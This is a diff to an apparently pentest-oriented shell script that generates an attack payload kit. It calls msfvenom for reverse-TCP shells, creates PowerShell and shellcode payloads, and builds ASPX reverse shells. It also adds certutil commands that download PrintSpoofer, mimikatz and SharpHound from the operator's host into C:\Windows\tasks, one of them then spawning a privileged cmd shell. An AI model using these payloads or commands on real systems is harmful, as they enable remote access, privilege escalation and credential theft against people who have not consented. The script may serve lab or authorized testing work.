@@ -109,6 +109,27 @@ msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=$
 
 echo "Building the prefered shells :)"
 echo '#POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
+python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
+
+
+#http/commands uitbreiden
+echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'certutil -urlcache -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+
+
+echo "cd C:\Windows\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
+echo "cd C:\Windows\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
+echo "cd C:\Windows\tasks && certutil -urlcache -f http://${IP}/SharpHound.exe sharphound.exe" > http/commands/sharphound
+
+
+
+
+
+
+
+
 echo 'IEX ()' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 invoke-shellcode.py ${IP} ${PORT}
 
@@ -126,9 +147,10 @@ cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe
 
 echo "[+] Generate ASPX reverse HTTPS shell"
 python3 methaspx.py ${IP} ${PORT}
-
+cp http/payloads/meth.aspx http/payloads/meth_https.aspx
 echo "[+] Generate ASPX reverse TCP shell"
-python3 methaspx.py ${IP} ${PORT}
+python3 methaspx.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
+
 
 
 echo "[+] Building MACRO txt"
